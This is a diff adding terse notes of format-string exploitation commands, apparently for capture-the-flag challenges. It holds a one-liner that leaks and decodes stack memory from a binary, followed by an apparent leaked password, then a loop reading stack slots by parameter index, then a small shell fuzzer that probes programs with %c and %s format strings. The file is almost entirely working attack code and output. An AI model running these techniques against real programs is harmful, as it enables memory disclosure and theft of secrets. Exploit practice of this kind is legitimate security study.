@@ -1,0 +1,43 @@
+1.
+
+echo -e $(./binary5 $(ruby -e 'print "%08x"*100') | sed -r 's/(..)(..)(..)(..)/\4\3\2\1/g; s/(..)/\\x&/g' ) | grep -Eazo '[[:print:]]{13}'
+Dpa9d6)(Epamd
+
+
+2. 
+
+for i in `seq 1 2 20`; do ./ch5 "%$i"'$08X'"%$((i+1))"'$08X'; echo; done
+
+
+3. fuzzer
+
+#!/bin/sh
+
+### MINI FUZZER FORMAT STRING
+
+a=128
+b=32
+
+padding=""
+i=0
+
+if [ "$1" == "" ]
+then
+       echo "Usage: $0 [program]"
+       exit
+fi
+
+while [ $i -lt $a ]
+do
+       j=0
+       str="===%s==="
+       padding=".$padding"
+       while [ $j -lt $b ]
+       do
+               str="%c$str"
+               { $1 "$padding$str"; } 2> /dev/null
+               j=$((j+1))
+       done
+
+       i=$((i+1))
+done
